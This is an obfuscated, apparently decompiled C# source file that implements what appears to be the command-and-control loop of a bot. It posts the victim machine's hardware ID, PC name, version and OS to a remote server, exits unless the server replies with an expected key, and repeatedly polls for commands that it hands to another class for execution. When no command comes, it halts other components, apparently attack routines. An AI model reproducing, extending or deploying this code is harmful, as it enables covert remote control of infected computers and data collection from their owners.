using System;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using ns3;
using ns4;

namespace ns2;

internal sealed class Class11 : Class10
{
	private static string string_0 = string.Empty;

	public static void smethod_3()
	{
		smethod_4();
		Thread thread = new Thread(smethod_5);
		thread.Start();
	}

	private static void smethod_4()
	{
		string string_ = "mode=0&hwid=" + Class15.string_2 + "&pcname=" + Class15.string_4 + "&version=" + Class15.string_5 + "&system=" + Class15.string_3;
		while (true)
		{
			try
			{
				string text = smethod_6(Class15.string_6, string_);
				if (text.Length > 0)
				{
					if (text == Class15.string_1)
					{
						break;
					}
					Environment.Exit(0);
				}
			}
			catch
			{
			}
			Thread.Sleep(Class15.int_0 * 1000);
		}
	}

	private static void smethod_5()
	{
		string string_ = "mode=1&hwid=" + Class15.string_2;
		while (true)
		{
			try
			{
				string text = smethod_6(Class15.string_6, string_);
				if (text.Length > 0)
				{
					if (text != string_0)
					{
						Class10.smethod_0(text);
						string_0 = text;
					}
				}
				else
				{
					try
					{
						Class21.smethod_1();
					}
					catch
					{
					}
					try
					{
						Class18.smethod_1();
					}
					catch
					{
					}
					string_0 = string.Empty;
				}
			}
			catch
			{
			}
			Thread.Sleep(Class15.int_0 * 1000);
		}
	}

	private static string smethod_6(string string_1, string string_2)
	{
		ServicePointManager.Expect100Continue = false;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(string_1);
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.Method = "POST";
		httpWebRequest.UserAgent = Class15.string_1;
		byte[] bytes = Encoding.Default.GetBytes(string_2);
		httpWebRequest.ContentLength = bytes.Length;
		Stream requestStream = httpWebRequest.GetRequestStream();
		requestStream.Write(bytes, 0, bytes.Length);
		requestStream.Close();
		WebResponse response = httpWebRequest.GetResponse();
		if (response == null)
		{
			return string.Empty;
		}
		StreamReader streamReader = new StreamReader(response.GetResponseStream());
		return streamReader.ReadToEnd().Trim();
	}
}
